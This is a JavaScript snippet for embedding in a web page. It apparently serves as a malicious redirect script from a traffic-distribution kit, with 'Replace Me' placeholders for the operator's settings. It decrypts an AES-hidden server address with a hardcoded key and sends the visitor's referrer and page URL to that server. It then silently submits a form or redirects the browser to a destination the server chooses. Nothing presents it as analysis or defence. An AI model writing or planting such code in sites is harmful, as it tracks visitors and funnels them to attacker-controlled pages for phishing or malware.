<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"></script>
<script type="text/javascript">
function exec()
{
  // Replace Me
  var config = { serverList: ['U2FsdGVkX19Wdo8Pp7TTU2j9hXuTvz1xzydKGVit+v45kgCmq9esfALLiG1fZ1fv'], redirectPage: 'rd.php', redirectMethod: 'POST', redirectFormMessage: 'blog', encKey: '12313'};
  // Replace Me

  var redirectServer = getServer();
  var redirectMethod = config.redirectMethod;
  var redirectServerUrl = redirectServer + '/' + config.redirectPage + '?from=' + document['referrer'] + '&amp;self=' + window['location']['href'];

  var redirectPostObj = postToServer(redirectMethod, redirectServerUrl);
  redirectPostObj['onload'] = function() {
    var responseObj;
    var serverResponse = redirectPostObj['response'];

    if(serverResponse)
    {
      try
      {
        responseObj = JSON['parse'](redirectPostObj['response']);
      }
      catch (e)
      {
        console.error('Parsing of Server Response Failed');
      }
    }

    if(responseObj)
    {
      if(responseObj['message'] == config.redirectFormMessage)
      {
        $('#f')['val'](window['location']['href']);
        $('#form')['attr']('action', responseObj['url']);
        $('#form')['submit']();
      }
      else
      {
        var windowHref = window['location']['href'];
        var windowHrefPart = windowHref['split']('?ol=')[1];
        var locationPart = windowHrefPart['replace']('%3D', '=');
        window['location'] = locationPart;
      }
    }
  }

  if(!redirectPostObj)
  {
    throw new Error('CORS not supported');
  }

  redirectPostObj['send']();

  function postToServer(method, url)
  {
    var requestObj = new XMLHttpRequest();

    if('withCredentials' in requestObj)
    {
      requestObj['open'](method, url, true);
    }
    else
    {
      if(typeof XDomainRequest != 'undefined')
      {
        requestObj = new XDomainRequest();
        requestObj['open'](method, url);
      }
      else
      {
        requestObj = null;
      }
    }

    return requestObj;
  }

  function getServer()
  {
    var serverEncData = config.serverList[Math['floor'](Math['random']() * config.serverList['length'])];

    return CryptoJS['AES']['decrypt'](serverEncData, config.encKey).toString(CryptoJS['enc'].Utf8);
  }
}
</script>
